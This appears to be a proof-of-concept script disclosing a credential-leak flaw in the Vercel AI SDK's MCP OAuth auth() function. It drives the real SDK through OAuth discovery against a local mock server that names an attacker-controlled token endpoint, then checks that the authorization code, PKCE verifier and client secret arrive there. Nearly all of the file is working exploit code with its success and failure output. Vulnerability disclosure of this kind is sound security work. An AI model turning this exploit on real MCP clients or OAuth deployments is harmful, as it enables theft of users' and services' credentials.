/**
 * SSRF PoC using the REAL Vercel AI SDK (@ai-sdk/mcp).
 *
 * Proves the vulnerability by:
 * 1. Real OAuth discovery (SDK fetches .well-known)
 * 2. Real auth() from the SDK (not simulated logic)
 * 3. SDK sends authorization_code + client_secret + code_verifier to
 *    attacker-controlled token_endpoint returned by discovery.
 *
 * Prerequisites (from repo root):
 *   pnpm install
 *   cd packages/mcp && npx tsup --tsconfig tsconfig.build.json
 *
 * Run (from repo root):
 *   node test-ssrf-with-real-sdk.js
 */

const { auth } = require('./packages/mcp/dist/index.js');

const DISCOVERY_BASE = 'http://127.0.0.1:5050';
const RESOURCE_METADATA_URL = `${DISCOVERY_BASE}/.well-known/oauth-protected-resource`;

const stored = { codeVerifier: 'pkce_verifier_secret_123', tokens: null };

const mockProvider = {
  tokens: () => undefined,
  saveTokens: (tokens) => { stored.tokens = tokens; },
  redirectToAuthorization: () => {},
  saveCodeVerifier: (v) => { stored.codeVerifier = v; },
  codeVerifier: () => stored.codeVerifier,
  get redirectUrl() { return 'http://localhost:3000/callback'; },
  get clientMetadata() {
    return { redirect_uris: ['http://localhost:3000/callback'], scope: 'openid' };
  },
  clientInformation: () => ({
    client_id: 'legit_client_id',
    client_secret: 'legit_client_secret',
    redirect_uris: ['http://localhost:3000/callback'],
  }),
};

async function main() {
  const mock = require('./mock-discovery-and-attacker.js');
  await new Promise((r) => setTimeout(r, 300));

  console.log('SSRF PoC — using REAL @ai-sdk/mcp auth() and discovery chain\n');

  const result = await auth(mockProvider, {
    serverUrl: DISCOVERY_BASE,
    resourceMetadataUrl: new URL(RESOURCE_METADATA_URL),
    authorizationCode: 'stolen_auth_code_from_real_idp',
    fetchFn: fetch,
  });

  console.log('auth() result:', result);
  console.log('');

  if (mock.capturedTokenRequests.length === 0) {
    console.error('FAIL: No token request received by attacker server.');
    process.exit(1);
  }

  const req0 = mock.capturedTokenRequests[0];
  const body = req0.body || '';
  const headers = req0.headers || {};
  
  const hasCode = body.includes('stolen_auth_code_from_real_idp');
  const hasVerifier = body.includes('pkce_verifier_secret_123');
  
  // client_secret is sent via Authorization header (client_secret_basic)
  const authHeader = headers.authorization || '';
  const hasBasicAuth = authHeader.toLowerCase().startsWith('basic ');
  const hasSecret = hasBasicAuth;
  
  console.log('Request received by attacker (token_endpoint from discovery):');
  console.log(body);
  console.log('');
  console.log('Authorization header:', authHeader || '[missing]');
  console.log('Credentials captured by attacker:', { hasCode, hasSecret, hasVerifier });
  
  if (hasCode && hasVerifier && hasSecret) {
    console.log('\n>>> PoC SUCCESS: SDK sent authorization_code + code_verifier in body');
    console.log('    and client_id:client_secret via Basic Authorization header');
    console.log('    to attacker-controlled token_endpoint (no origin validation).');
  } else {
    console.log('\n>>> PoC FAILED: expected code+verifier in body + Basic auth header.');
  }
}


main().catch((err) => {
  console.error(err);
  process.exit(1);
});
